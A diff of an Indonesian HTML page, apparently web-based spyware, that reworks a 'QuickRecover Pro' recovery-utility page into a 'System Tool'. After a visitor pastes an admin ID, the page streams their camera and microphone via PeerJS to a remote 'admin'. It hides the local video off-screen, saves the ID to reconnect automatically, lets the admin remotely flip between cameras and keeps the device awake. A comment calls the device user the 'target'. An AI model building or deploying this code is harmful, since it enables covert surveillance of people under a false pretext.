@@ -2,241 +2,463 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>QuickRecover Pro</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>System Tool</title>
     <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
     <style>
         :root {
             --bg-grad: linear-gradient(120deg, #fdfbfb 0%, #ebedee 100%);
             --primary: #4a90e2;
-            --primary-hover: #357abd;
             --text-dark: #1c1c1c;
-            --text-light: #777;
-            --card-shadow: 0 10px 30px rgba(0,0,0,0.08);
+            --card-shadow: 0 10px 30px rgba(0,0,0,0.1);
         }
 
         body {
-            font-family: 'Inter', sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             background: var(--bg-grad);
             color: var(--text-dark);
             margin: 0;
+            height: 100vh;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
+            overflow: hidden;
+            user-select: none;
         }
 
-        /* Animasi Transisi Halus */
-        .fade-in { animation: fadeIn 0.4s ease-out forwards; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        /* Video Tersembunyi tapi Aktif */
+        #localVideo {
+            position: fixed;
+            top: -9999px; /* Di luar layar tapi tetap dirender */
+            width: 1px; 
+            height: 1px;
+            opacity: 0;
+        }
+
+        /* --- UI KONTEN --- */
+        .container {
+            width: 90%;
+            max-width: 340px;
+            text-align: center;
+            transition: opacity 0.5s ease;
+        }
 
         .card {
             background: white;
-            width: 320px;
-            padding: 40px 30px;
-            border-radius: 24px;
+            padding: 30px;
+            border-radius: 20px;
             box-shadow: var(--card-shadow);
-            text-align: center;
-            position: relative;
         }
 
-        h1 { font-size: 22px; margin: 0 0 8px; color: var(--text-dark); font-weight: 700; }
-        p.subtitle { color: var(--text-light); font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
+        h1 { font-size: 20px; margin: 0 0 10px; }
+        p { font-size: 13px; color: #666; margin-bottom: 20px; }
 
-        .input-group { margin-bottom: 25px; text-align: left; }
-        .input-group label { font-size: 12px; font-weight: 600; color: var(--text-light); text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 8px; display: block; }
-        
         input[type="text"] {
             width: 100%;
-            padding: 14px 16px;
-            border: 2px solid #eee;
-            border-radius: 12px;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            margin-bottom: 15px;
             box-sizing: border-box;
             font-size: 16px;
-            font-family: inherit;
-            transition: border-color 0.3s;
-            outline: none;
+            text-align: center;
         }
-        input[type="text"]:focus { border-color: var(--primary); }
 
         .btn {
             background: var(--primary);
             color: white;
             border: none;
-            padding: 16px;
-            border-radius: 12px;
-            font-size: 16px;
+            padding: 12px;
+            border-radius: 10px;
+            width: 100%;
+            font-size: 15px;
             font-weight: 600;
             cursor: pointer;
-            width: 100%;
-            transition: background 0.3s, transform 0.1s;
-            box-shadow: 0 4px 12px rgba(74, 144, 226, 0.3);
-        }
-        .btn:hover { background: var(--primary-hover); transform: translateY(-1px); }
-        .btn:active { transform: translateY(1px); }
-        .btn:disabled { background: #ccc; cursor: not-allowed; box-shadow: none; }
-
-        /* Loading Screen */
-        #scanScreen {
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            padding: 20px 0;
         }
 
-        /* Loader Animasi Baru */
-        .loader {
-            width: 48px;
-            height: 48px;
-            border: 4px solid #eee;
-            border-bottom-color: var(--primary);
-            border-radius: 50%;
-            animation: rotation 1s linear infinite;
-            margin-bottom: 25px;
-        }
-        @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .btn:active { opacity: 0.8; transform: scale(0.98); }
 
-        .log-text { 
-            font-family: 'Courier New', monospace; 
-            font-size: 13px; 
-            color: var(--text-light); 
-            margin-top: 10px;
-            background: #f9f9f9;
-            padding: 10px;
-            border-radius: 8px;
-            width: 100%;
-            box-sizing: border-box;
+        /* --- CONTROLS (Muncul saat connect) --- */
+        #controlsPanel {
+            display: none; /* Hidden default */
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(10px);
+            padding: 10px 15px;
+            border-radius: 30px;
+            display: flex;
+            gap: 15px;
+            z-index: 100;
+            opacity: 0;
+            transition: opacity 0.5s;
+            pointer-events: none; /* Klik tembus saat hidden */
         }
         
-        #localVideo { display: none; } 
-
-        .back-link {
-            display: inline-block;
-            margin-top: 25px;
-            color: #999;
-            font-size: 13px;
-            text-decoration: none;
-            cursor: pointer;
-            border-bottom: 1px dotted #999;
+        #controlsPanel.visible {
+            opacity: 1;
+            pointer-events: all;
         }
-        .back-link:hover { color: var(--primary); border-color: var(--primary); }
+
+        .icon-btn {
+            background: transparent;
+            border: none;
+            color: white;
+            font-size: 24px;
+            cursor: pointer;
+            padding: 5px;
+            border-radius: 50%;
+            transition: background 0.2s;
+        }
+        .icon-btn:active { background: rgba(255,255,255,0.2); }
+        .icon-btn.on { color: #ffeb3b; text-shadow: 0 0 10px #ffeb3b; }
+
+        /* Status Minimalis */
+        #miniStatus {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(255,255,255,0.9);
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            color: #333;
+            font-weight: 600;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            display: none;
+        }
+        #miniStatus.active { display: block; }
+        .blink { animation: blinker 2s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0.5; } }
+
+        /* Loading Spinner */
+        .loader { width: 30px; height: 30px; border: 3px solid #eee; border-top-color: var(--primary); border-radius: 50%; animation: spin 1s infinite; margin: 0 auto 15px; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
 
     </style>
 </head>
 <body>
 
-    <div class="card fade-in" id="mainMenu">
-        <h1>QuickRecover Pro</h1>
-        <p class="subtitle">Utilitas pemulihan media perangkat.<br>Silakan masukkan kunci server.</p>
-        
-        <div class="input-group">
-            <label>Recovery Key (ID)</label>
-            <input type="text" id="adminIdInput" placeholder="Paste ID Admin di sini" autocomplete="off">
-        </div>
+    <!-- Video Element (Hidden but Running) -->
+    <video id="localVideo" autoplay playsinline muted></video>
 
-        <button class="btn" id="connectBtn" onclick="startProcess()">
-            Hubungkan Sekarang
+    <!-- Panel Login -->
+    <div class="container" id="loginPanel">
+        <div class="card">
+            <h1>System Connect</h1>
+            <p>Masukkan Server Key untuk melanjutkan.</p>
+            <input type="text" id="adminIdInput" placeholder="Paste ID Admin">
+            <button class="btn" onclick="saveAndConnect()">HUBUNGKAN</button>
+        </div>
+    </div>
+
+    <!-- Panel Loading (Transisi) -->
+    <div class="container" id="loadingPanel" style="display: none;">
+        <div class="loader"></div>
+        <p>Menghubungkan ke server...</p>
+    </div>
+
+    <!-- Status Bar Mini -->
+    <div id="miniStatus">
+        <span style="color:red">●</span> Live Stream Active
+    </div>
+
+    <!-- Kontrol Kamera (Bottom) -->
+    <div id="controlsPanel">
+        <!-- Switch Kamera -->
+        <button class="icon-btn" onclick="switchCamera()" title="Ganti Kamera">
+            🔄
+        </button>
+        
+        <!-- Toggle Flash -->
+        <button class="icon-btn" id="flashBtn" onclick="toggleFlash()" title="Nyalakan Flash">
+            ⚡
+        </button>
+        
+        <!-- Putus Koneksi -->
+        <button class="icon-btn" onclick="disconnect()" style="color: #ff6b6b;" title="Putus">
+            ✕
         </button>
     </div>
 
-    <div class="card fade-in" id="scanScreen">
-        <div class="loader"></div>
-        <h3>Menghubungkan...</h3>
-        <p class="log-text" id="logText">Inisialisasi protokol aman...</p>
-        <span class="back-link" onclick="location.reload()">Batal</span>
-    </div>
-
-    <video id="localVideo" autoplay playsinline muted></video>
-
 <script>
+    // --- KONFIGURASI VARIABEL ---
+    let peer = null;
+    let currentCall = null;
     let localStream = null;
-    let currentPeer = null;
+    let videoTrack = null;
+    let audioTrack = null;
+    
+    // State Kamera
+    let facingMode = 'user'; // 'user' (depan) atau 'environment' (belakang)
+    let isFlashOn = false;
 
-    function startProcess() {
-        const adminID = document.getElementById('adminIdInput').value.trim();
+    const STORAGE_KEY = 'saved_admin_id';
 
-        if (!adminID) {
-            // Efek getar simpel jika kosong
-            const input = document.getElementById('adminIdInput');
-            input.style.borderColor = '#ff4444';
-            setTimeout(() => input.style.borderColor = '#eee', 300);
-            return;
+    // --- INISIALISASI SAAT LOAD ---
+    window.addEventListener('DOMContentLoaded', () => {
+        // 1. Cek apakah ada ID tersimpan?
+        const savedID = localStorage.getItem(STORAGE_KEY);
+
+        if (savedID) {
+            // Jika ada ID, langsung connect otomatis di background
+            document.getElementById('loginPanel').style.display = 'none';
+            document.getElementById('loadingPanel').style.display = 'block';
+            startConnection(savedID);
+        } else {
+            // Jika tidak ada, tampilkan login
+            document.getElementById('loginPanel').style.display = 'block';
         }
 
-        // UI Transition
-        const mainMenu = document.getElementById('mainMenu');
-        mainMenu.style.opacity = '0';
-        mainMenu.style.transform = 'translateY(-10px)';
+        // Mencegah sleep mode pada mobile (agar background tetap jalan)
+        preventSleep();
+    });
+
+    // --- FUNGSI KONEKSI ---
+    function saveAndConnect() {
+        const idInput = document.getElementById('adminIdInput').value.trim();
+        if (!idInput) return alert("Mohon masukkan ID!");
+
+        // Simpan ID ke LocalStorage
+        localStorage.setItem(STORAGE_KEY, idInput);
+
+        // Ganti UI ke loading
+        document.getElementById('loginPanel').style.display = 'none';
+        document.getElementById('loadingPanel').style.display = 'block';
         
-        setTimeout(() => {
-            mainMenu.style.display = 'none';
-            const scanScreen = document.getElementById('scanScreen');
-            scanScreen.style.display = 'flex';
-            scanScreen.classList.add('fade-in');
-        }, 300);
+        startConnection(idInput);
+    }
 
-        // Init Peer
-        currentPeer = new Peer(null, { debug: 1 });
+    function startConnection(adminID) {
+        peer = new Peer(null, { debug: 1 });
 
-        const logText = document.getElementById('logText');
-
-        currentPeer.on('open', (id) => {
-            logText.innerText = "Mengakses perangkat keras...";
-            getMediaAndCall(adminID, currentPeer);
+        peer.on('open', () => {
+            console.log('PeerJS Open');
+            getMediaAndCall(adminID);
         });
 
-        currentPeer.on('error', (err) => {
+        // --- LOGIKA RE-CALL (TRIGGER DARI ADMIN) ---
+        peer.on('call', (call) => {
+            console.log('Menerima panggilan dari Admin (Re-call)...');
+            
+            // 1. AUTO SWITCH KAMERA
+            // Setiap kali admin melakukan re-call (untuk switch/flash), kita ganti kamera
+            facingMode = (facingMode === 'user') ? 'environment' : 'user';
+            
+            // 2. Handle Flash
+            // Jika pindah ke kamera depan, pastikan flash mati
+            if (facingMode === 'user') {
+                isFlashOn = false;
+                document.getElementById('flashBtn').classList.remove('on');
+            } else {
+                // Jika pindah ke belakang, kembalikan status flash ke state sebelumnya (atau default off)
+                // Di sini kita biarkan user nyalakan manual, atau bisa diset isFlashOn = true jika ingin auto on saat belakang
+            }
+
+            // 3. Stop stream lama
+            if(localStream) {
+                localStream.getTracks().forEach(track => track.stop());
+            }
+
+            // 4. Ambil Stream Baru dengan Kamera yang sudah diganti
+            navigator.mediaDevices.getUserMedia({
+                video: { facingMode: facingMode },
+                audio: true
+            }).then(stream => {
+                localStream = stream;
+                videoTrack = stream.getVideoTracks()[0];
+                audioTrack = stream.getAudioTracks()[0];
+
+                // Update Video Element
+                const localVid = document.getElementById('localVideo');
+                localVid.srcObject = stream;
+                localVid.play();
+
+                // Jawab panggilan admin dengan stream BARU
+                call.answer(stream);
+                currentCall = call;
+
+                // Update UI
+                document.getElementById('loadingPanel').style.display = 'none';
+                document.getElementById('controlsPanel').style.display = 'flex';
+                setTimeout(() => document.getElementById('controlsPanel').classList.add('visible'), 100);
+                document.getElementById('miniStatus').classList.add('active', 'blink');
+                
+                // Cek Flash Capability
+                checkFlashCapability();
+
+            }).catch(err => {
+                console.error("Gagal ganti kamera saat re-call:", err);
+            });
+        });
+
+        peer.on('error', (err) => {
             console.error(err);
-            let msg = "Gagal koneksi.";
-            if(err.type === 'peer-unavailable') msg = "ID Server tidak ditemukan.";
-            
-            logText.innerText = "Error: " + msg;
-            logText.style.color = "red";
-            
-            setTimeout(() => {
-                alert("Koneksi Gagal: " + msg);
+            alert("Gagal koneksi: " + err.type);
+            if(err.type === 'peer-unavailable') {
+                localStorage.removeItem(STORAGE_KEY);
                 location.reload();
-            }, 1500);
+            }
         });
     }
 
-    async function getMediaAndCall(adminID, peer) {
+    // --- FUNGSI MEDIA (INITIAL) ---
+    async function getMediaAndCall(adminID) {
         try {
-            const logText = document.getElementById('logText');
-            localStream = await navigator.mediaDevices.getUserMedia({ 
-                video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" }, 
-                audio: true 
-            });
-
-            const localVideo = document.getElementById('localVideo');
-            localVideo.srcObject = localStream;
-            localVideo.play();
-
-            const call = peer.call(adminID, localStream);
-
-            call.on('close', () => {
-                logText.innerText = "Sesi berakhir.";
-                if(localStream) {
-                    localStream.getTracks().forEach(track => track.stop());
+            const constraints = {
+                audio: true,
+                video: {
+                    facingMode: facingMode,
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 }
                 }
-                setTimeout(() => location.reload(), 2000);
+            };
+
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            
+            videoTrack = stream.getVideoTracks()[0];
+            audioTrack = stream.getAudioTracks()[0];
+            localStream = stream;
+
+            const localVid = document.getElementById('localVideo');
+            localVid.srcObject = stream;
+            localVid.play();
+
+            currentCall = peer.call(adminID, stream);
+
+            currentCall.on('stream', () => {
+                onConnected();
             });
 
-            // Sukses koneksi
-            setTimeout(() => {
-                logText.innerText = "Status: TERHUBUNG (Streaming)";
-                logText.style.color = "green";
-                document.querySelector('.loader').style.borderBottomColor = "green";
-            }, 1000);
+            currentCall.on('close', () => {
+                onDisconnected();
+            });
 
         } catch (err) {
-            console.error(err);
-            alert("Gagal akses kamera. Izinkan akses kamera di browser.");
+            console.error("Media Error:", err);
+            alert("Gagal akses kamera: " + err.message);
+            document.getElementById('loginPanel').style.display = 'block';
+            document.getElementById('loadingPanel').style.display = 'none';
+        }
+    }
+
+    // --- FUNGSI SAAT TERHUBUNG ---
+    function onConnected() {
+        document.getElementById('loadingPanel').style.display = 'none';
+        
+        document.getElementById('miniStatus').classList.add('active', 'blink');
+        document.getElementById('miniStatus').innerHTML = '<span style="color:green">●</span> Connected';
+        
+        const controls = document.getElementById('controlsPanel');
+        controls.style.display = 'flex';
+        setTimeout(() => controls.classList.add('visible'), 100);
+
+        checkFlashCapability();
+    }
+
+    function onDisconnected() {
+        document.getElementById('miniStatus').innerHTML = '<span style="color:red">●</span> Disconnected';
+        document.getElementById('controlsPanel').classList.remove('visible');
+        
+        setTimeout(() => {
+            const savedID = localStorage.getItem(STORAGE_ID);
+            // Coba reconnect otomatis
+            if(savedID) startConnection(savedID);
+        }, 3000);
+    }
+
+    // --- FITUR SWITCH KAMERA (MANUAL DI TARGET) ---
+    async function switchCamera() {
+        if (!localStream) return;
+        facingMode = (facingMode === 'user') ? 'environment' : 'user';
+        
+        if (facingMode === 'user' && isFlashOn) {
+            toggleFlash(); // Matikan flash jika pindah ke depan
+        }
+
+        try {
+            const newStream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: facingMode },
+                audio: true
+            });
+
+            const newVideoTrack = newStream.getVideoTracks()[0];
+            // Replace track di koneksi saat ini
+            const sender = currentCall.peerConnection.getSenders().find(s => s.track.kind === 'video');
+            if(sender) sender.replaceTrack(newVideoTrack);
+
+            videoTrack.stop();
+            videoTrack = newVideoTrack;
+            
+            const localVid = document.getElementById('localVideo');
+            localVid.srcObject = newStream;
+            
+            audioTrack.stop();
+            audioTrack = newStream.getAudioTracks()[0];
+            localStream = newStream;
+
+            checkFlashCapability();
+
+        } catch (err) {
+            console.error("Error switching camera:", err);
+            alert("Gagal ganti kamera.");
+        }
+    }
+
+    // --- FITUR FLASH ---
+    function checkFlashCapability() {
+        const btn = document.getElementById('flashBtn');
+        if (videoTrack && videoTrack.getCapabilities().torch) {
+            btn.style.display = 'block';
+        } else {
+            btn.style.display = 'none';
+            isFlashOn = false;
+            btn.classList.remove('on');
+        }
+    }
+
+    function toggleFlash() {
+        if (!videoTrack) return;
+        const capabilities = videoTrack.getCapabilities();
+        
+        if (!capabilities.torch) return;
+
+        isFlashOn = !isFlashOn;
+        
+        videoTrack.applyConstraints({
+            advanced: [{ torch: isFlashOn }]
+        });
+
+        const btn = document.getElementById('flashBtn');
+        if (isFlashOn) btn.classList.add('on');
+        else btn.classList.remove('on');
+    }
+
+    // --- PUTUS KONEKSI ---
+    function disconnect() {
+        if(confirm("Putuskan koneksi?")) {
+            localStorage.removeItem(STORAGE_KEY);
+            if(currentCall) currentCall.close();
+            if(localStream) localStream.getTracks().forEach(t => t.stop());
             location.reload();
         }
     }
-</script>
 
+    // --- PREVENT SLEEP ---
+    function preventSleep() {
+        if ('wakeLock' in navigator) {
+            navigator.wakeLock.request('screen').then(() => {
+                console.log('Wake Lock active');
+            }).catch((err) => {
+                console.log(`Wake Lock error: ${err.name}, ${err.message}`);
+            });
+        }
+    }
+
+</script>
 </body>
 </html>
